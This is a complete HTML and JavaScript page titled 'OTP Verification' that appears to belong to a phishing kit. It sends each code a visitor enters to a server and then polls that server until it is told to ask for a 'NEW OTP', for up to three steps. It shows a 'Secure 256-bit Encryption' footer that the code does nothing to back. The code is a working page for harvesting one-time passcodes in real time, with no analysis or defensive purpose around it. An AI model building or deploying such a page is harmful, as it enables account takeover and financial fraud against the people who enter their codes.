<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>OTP Verification</title>

<style>
  body {
    margin: 0;
    font-family: Arial;
    background: #0b5c6b;
    color: white;
    text-align: center;
  }

  .header {
    background: #0b5c6b;
    color: #ffcc00;
    padding: 15px;
    font-size: 20px;
    font-weight: bold;
  }

  .container {
    background: white;
    color: black;
    max-width: 350px;
    margin: 40px auto;
    padding: 25px;
    border-radius: 15px;
  }

  input {
    width: 100%;
    padding: 15px;
    margin-top: 15px;
    border-radius: 10px;
    border: 1px solid #ccc;
    text-align: center;
    font-size: 18px;
    letter-spacing: 5px;
  }

  button {
    width: 100%;
    padding: 15px;
    margin-top: 20px;
    background: #ffcc00;
    border: none;
    border-radius: 10px;
    font-weight: bold;
    cursor: pointer;
  }

  button:disabled {
    opacity: 0.6;
    cursor: not-allowed;
  }

  .footer {
    margin-top: 20px;
    font-size: 12px;
  }

  .step-text {
    font-size: 14px;
    color: #666;
    margin-bottom: 10px;
  }
</style>
</head>

<body>

<div class="header">Verification Step</div>

<div class="container">
  <div id="stepIndicator" class="step-text">Step 1 of 3</div>
  <h3 id="instruction">Enter OTP sent to your phone</h3>

  <form id="otpForm">
    <input type="number" id="otpInput" placeholder="******" required>
    <button type="submit" id="otpBtn">Verify OTP</button>
  </form>
</div>

<div class="footer">Secure 256-bit Encryption</div>

<script>
const phone = localStorage.getItem("phone");
let currentStep = 1;

if (!phone) {
  window.location.href = "/";
}

// SUBMIT OTP
document.getElementById("otpForm").addEventListener("submit", async (e) => {
  e.preventDefault();

  const otp = document.getElementById("otpInput").value;
  const btn = document.getElementById("otpBtn");

  btn.innerText = "Checking...";
  btn.disabled = true;

  try {
    const res = await fetch("/send-otp", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ phone, otp, step: currentStep })
    });

    if (!res.ok) throw new Error("Server error");

    waitStep();

  } catch (err) {
    alert("Network error. Please try again.");
    btn.innerText = "Verify OTP";
    btn.disabled = false;
  }
});

// CHECK STATUS LOOP
async function waitStep() {
  try {
    const res = await fetch("/check-otp-status/" + phone);

    if (!res.ok) throw new Error("Status error");

    const data = await res.json();

    if (data.status === "next") {
      currentStep = data.nextStep || currentStep + 1;

      document.getElementById("stepIndicator").innerText =
        `Step ${currentStep} of 3`;

      document.getElementById("instruction").innerText =
        "Enter the NEW OTP sent to you";

      document.getElementById("otpInput").value = "";

      const btn = document.getElementById("otpBtn");
      btn.innerText = "Verify OTP";
      btn.disabled = false;

    } else if (data.status === "success") {
      window.location.href = "/success.html";
      return;

    } else {
      setTimeout(waitStep, 2000);
    }

  } catch (err) {
    console.log("Polling error:", err.message);
    setTimeout(waitStep, 3000);
  }
}
</script>

</body>
</html>
